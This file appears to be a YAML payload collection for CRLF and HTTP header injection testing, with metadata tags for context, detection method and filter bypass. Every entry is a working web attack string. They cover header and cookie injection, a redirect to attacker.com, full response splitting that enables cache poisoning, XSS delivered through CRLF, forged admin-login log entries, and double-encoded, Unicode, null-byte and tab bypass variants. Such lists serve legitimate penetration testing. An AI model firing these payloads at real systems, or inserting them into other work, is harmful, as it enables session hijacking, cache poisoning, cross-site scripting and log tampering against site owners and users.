# CRLF / HTTP Header Injection Payloads with Metadata
# Usage: Filter by type or context for targeted testing

payloads:
  # Basic CRLF sequences
  - payload: "%0d%0aInjected-Header:true"
    type: header-injection
    context: [redirect-url, header-value]
    detection: header-presence

  - payload: "%0d%0aSet-Cookie:session=evil"
    type: header-injection
    context: [redirect-url, header-value]
    detection: header-presence

  - payload: "%0d%0aLocation:http://attacker.com"
    type: header-injection
    context: [redirect-url, header-value]
    detection: redirect-observation

  - payload: "\\r\\nInjected-Header:true"
    type: header-injection
    context: [header-value, log-entry]
    detection: header-presence

  - payload: "\\r\\nSet-Cookie:session=evil"
    type: header-injection
    context: [header-value, log-entry]
    detection: header-presence

  # Double-encoded CRLF
  - payload: "%250d%250aInjected-Header:true"
    type: header-injection
    context: [redirect-url, header-value]
    bypass_type: double-encoding
    detection: header-presence

  - payload: "%25%30%64%25%30%61Injected-Header:true"
    type: header-injection
    context: [redirect-url, header-value]
    bypass_type: double-encoding
    detection: header-presence

  # Response splitting
  - payload: "%0d%0a%0d%0a<html><body>Injected</body></html>"
    type: response-splitting
    context: [redirect-url, header-value]
    detection: body-injection

  - payload: "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>"
    type: response-splitting
    context: [redirect-url, header-value]
    detection: body-injection
    warning: "Full HTTP response splitting - may allow cache poisoning"

  # XSS via CRLF
  - payload: "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"
    type: XSS-via-CRLF
    context: [redirect-url, header-value]
    detection: body-injection

  - payload: "%0d%0a%0d%0a<script>alert(document.domain)</script>"
    type: XSS-via-CRLF
    context: [redirect-url, header-value]
    detection: body-injection

  # Log injection
  - payload: "%0d%0a[INFO] Fake log entry - admin login successful"
    type: log-injection
    context: [log-entry, header-value, user-input]
    detection: log-observation

  - payload: "\\r\\n[ERROR] 127.0.0.1 - admin authenticated"
    type: log-injection
    context: [log-entry, user-input]
    detection: log-observation

  - payload: "%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost:localhost"
    type: log-injection
    context: [log-entry]
    detection: log-observation
    warning: "Injects fake HTTP request into access logs"

  # Unicode CRLF variants
  - payload: "%e5%98%8a%e5%98%8dInjected-Header:true"
    type: header-injection
    context: [redirect-url, header-value]
    bypass_type: unicode-bypass
    detection: header-presence
    warning: "UTF-8 encoding of CR/LF - bypasses some filters"

  - payload: "%c4%8d%c4%8aInjected-Header:true"
    type: header-injection
    context: [redirect-url, header-value]
    bypass_type: unicode-bypass
    detection: header-presence

  # Null-byte + CRLF
  - payload: "%00%0d%0aInjected-Header:true"
    type: header-injection
    context: [redirect-url, header-value]
    bypass_type: null-byte
    detection: header-presence

  # Tab-based header injection
  - payload: "%09Injected-Header:true"
    type: header-injection
    context: [header-value, redirect-url]
    bypass_type: tab-injection
    detection: header-presence
